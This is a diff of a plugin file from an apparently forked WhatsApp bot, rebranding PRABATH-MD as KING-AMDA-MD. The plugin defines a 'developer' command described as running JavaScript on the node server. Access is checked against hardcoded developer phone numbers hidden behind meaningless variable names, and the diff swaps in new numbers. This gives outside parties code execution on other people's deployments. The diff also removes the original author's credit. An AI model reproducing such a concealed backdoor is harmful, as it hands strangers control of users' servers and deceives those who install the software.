@@ -1,15 +1,16 @@
 /**
-░█▀▀█ ░█▀▀█ ─█▀▀█ ░█▀▀█ ─█▀▀█ ▀▀█▀▀ ░█─░█ ── ░█▀▄▀█ ░█▀▀▄ 
-░█▄▄█ ░█▄▄▀ ░█▄▄█ ░█▀▀▄ ░█▄▄█ ─░█── ░█▀▀█ ▀▀ ░█░█░█ ░█─░█ 
-░█─── ░█─░█ ░█─░█ ░█▄▄█ ░█─░█ ─░█── ░█─░█ ── ░█──░█ ░█▄▄▀
 
-* @project_name PRABATH-MD
-* @author Prabath Kumara <https://github.com/prabathLK>
+░█▀▀▉░    ░█▀▄▀█    ░█▀▀▄    ░█▀▀▉░                    
+░█▆▆▉░    ░█░█░█    ░█─░█    ░█▆▆▉░                  
+░█─░█░    ░█──░█    ░█▄▄▀    ░█─░█░
+
+* @project_name KING-AMDA-MD
+* @author cyber flazy & king amda bot-team <https://github.com/flazy123/KING-AMDA-MD>
 * @description The main hope of creating this bot is to take full advantage of the WhatsApp app and make its work easier
-* @link <https://github.com/prabathLK/PRABATH-MD>
-* @version 2.0.0
+* @link <https://github.com/flazy123/KING-AMDA-MD>
+* @version 1.0.0
 
-© 2023 Prabath Kumara, SACHI-BOT. All rights reserved.
+© 2023 flazy saviya dexter, FLAZY-BOT. All rights reserved.
 Licensed under the  GPL-3.0 License;
 you may not use this file except in compliance with the License.*/
 
@@ -27,8 +28,8 @@ const { cmd, commands } = require('../command')
  desc: "Runs js code on node server." 
 }, 
 async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
-const qpmzalgrk = ['94725881990'];
-const ftpwgmecn = ['94762280384'];
+const qpmzalgrk = ['94767533889'];
+const ftpwgmecn = ['94741084633'];
 const qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs = qpmzalgrk.includes(senderNumber) || ftpwgmecn.includes(senderNumber)
 	    if (!qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs) return reply("*THIS DEVELOPER COMMAND* 📛 ")
  try 
